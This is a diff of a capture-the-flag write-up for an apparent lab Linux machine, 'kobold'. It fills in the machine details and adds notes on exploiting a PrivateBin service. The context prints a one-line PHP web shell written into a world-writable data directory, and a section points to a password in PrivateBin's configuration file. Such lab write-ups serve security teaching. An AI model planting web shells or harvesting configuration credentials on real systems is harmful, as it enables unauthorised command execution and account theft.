@@ -1,13 +1,13 @@
 
-| Property         | Value                         |
-| ---------------- | ----------------------------- |
-| **OS**           | Linux / Windows               |
-| **Difficulty**   | Easy / Medium / Hard / Insane |
-| **Release Date** | YYYY-MM-DD                    |
-| **State**        | YYYY-MM-DD                    |
-| **IP**           | 10.10.10.X                    |
-| **Techniques**   | technique-1, technique-2      |
-| **Tags**         | #web #privesc #linux          |
+| Property         | Value                    |
+| ---------------- | ------------------------ |
+| **OS**           | Linux                    |
+| **Difficulty**   | Easy                     |
+| **Release Date** | 2026-03-21               |
+| **State**        | Active                   |
+| **IP**           | 10.129.58.91             |
+| **Techniques**   | technique-1, technique-2 |
+| **Tags**         | #web #privesc #linux     |
 
 ---
 ## Summary
@@ -235,7 +235,7 @@ find: '/privatebin-data/cfg': Permission denied
 
 ```
 
-World writable directory b5 can be used to upload a .php shell accessible from bin.kobold.htb
+World writable directory b5 can be used to upload a .php shell accessible from bin.kobold.htb by changing the template cookie (i think its a cookie?)
 
 ```
 ben@kobold:/privatebin-data/data/bd$ ls -la
@@ -251,6 +251,8 @@ drwxrwxrwx 2 root operator 4096 Mar 15 21:23 b5
 ben@kobold:/privatebin-data/data/bd/b5$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
 ```
 
+IMAGE 3
+
 IMAGE 4
 
 curl alternative:
@@ -263,6 +265,8 @@ uid=65534(nobody) gid=82(www-data) groups=82(www-data)
 ```
 
 ### Credentials disclosure
+
+a password can be found in the default directory of private bin configuration file.
 
 ```
  curl -k https://bin.kobold.htb/ \
